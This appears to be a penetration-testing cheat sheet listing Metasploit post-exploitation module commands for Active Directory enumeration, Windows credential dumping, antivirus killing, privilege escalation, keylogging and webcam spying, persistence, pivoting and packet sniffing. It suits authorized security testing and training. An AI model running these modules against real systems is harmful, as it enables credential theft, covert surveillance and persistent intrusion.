---
cover: https://solocybertech.com/wp-content/uploads/2022/10/metasploit-diesec.webp
coverY: 0
---

# Metasploit Modules

## Active Directory modules

```java
use post/windows/gather/enum_ad_to_wordlist
use post/windows/gather/enum_ad_bitlocker
use post/windows/gather/enum_ad_computers
use post/windows/gather/enum_ad_groups
use post/windows/gather/enum_ad_managedby_groups
use post/windows/gather/enum_ad_service_principal_names 
use post/windows/gather/enum_ad_user_comments 
use post/windows/gather/credentials/enum_laps
```

## Windows Modules

```java
use post/windows/capture/lockout_keylogger
use post/windows/gather/bitlocker_fvek
use post/windows/gather/cachedump
use post/windows/gather/credentials/credential_collector
use post/windows/gather/credentials/outlook
use post/windows/gather/credentials/enum_cred_store
use post/windows/gather/credentials/rdc_manager_creds
use post/windows/gather/credentials/skype
use post/windows/gather/credentials/sso
use post/windows/gather/credentials/windows_autologin
use post/windows/gather/enum_services
use post/windows/gather/enum_unattend
use post/windows/gather/tcpnetstat
use post/windows/gather/lsa_secrets
use post/windows/gather/netlm_downgrade
use post/windows/gather/phish_windows_credentials
use post/windows/manage/wdigest_caching
```

### Generic

```java
use post/windows/manage/killav
use post/windows/manage/download_exec
use post/windows/manage/enable_rdp
use post/windows/manage/exec_powershell
use post/windows/manage/inject_host
use post/windows/manage/migrate
use post/windows/manage/reflective_dll_inject
use post/windows/manage/rollback_defender_signatures
use post/windows/manage/vss_mount
```

## Privilege escalation

* **Linux Recon**

```java
use post/multi/recon/local_exploit_suggester
```

* **Windows Modules**

```java
use post/windows/escalate/droplnk
use post/windows/escalate/getsystem
use post/windows/escalate/golden_ticket
use post/windows/escalate/screen_unlock
use post/windows/escalate/unmarshal_cmd_exec
use exploit/windows/local/trusted_service_path
```

### Spying Modules

```java
use post/windows/capture/keylog_recorder
use post/windows/gather/screen_spy
use post/windows/manage/webcam
```

## Persistence

```java
exploit/windows/local/persistence
```

## Pivoting

```java
post/windows/manage/autoroute
```

## OS X

```java
exploit/osx/local/persistence
```

## Forensic Modules

```java
use post/windows/gather/dumplinks
use post/windows/gather/enum_muicache
use post/windows/gather/file_from_raw_ntfs
use post/windows/gather/forensics/enum_drives
use post/windows/gather/forensics/imager
use post/windows/gather/forensics/recovery_files
```

## Packet Sniffing Modules

```java
use sniffer
sniffer_interfaces
sniffer_start <ID>
sniffer_dump <ID> /tmp/sniff.pcap
sniffer_stop <ID>
sniffer_release <ID>
```
